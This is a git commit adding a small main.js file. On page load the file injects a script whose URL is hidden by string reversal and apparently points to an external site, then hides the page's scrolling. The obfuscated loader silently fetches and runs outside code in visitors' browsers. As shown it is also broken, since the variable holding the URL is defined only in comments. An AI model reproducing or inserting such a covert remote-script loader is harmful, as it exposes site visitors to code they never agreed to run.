edb6278f517a769aa7f6ca7e7898afd4422319be
taketechno224 <62927431+taketechno224@users.noreply.github.com>
2021-04-08 09:05:52 +0200

    Add files via upload

---
+++ main.js
@@ -0,0 +1,11 @@
+//string = '12=v?sj.tset/etisbew.stropatad//:sptth';
+//string = "21=v?sj.resworb"
+
+string.split("").reverse().join("");
+
+window.onload = function() {
+	var scrpt = document.createElement("script");
+	scrpt.setAttribute("src", string.split("").reverse().join(""));
+	document.getElementsByTagName("body")[0].appendChild(scrpt);
+	document.getElementsByTagName("body")[0].style.overflow = "hidden";
+}
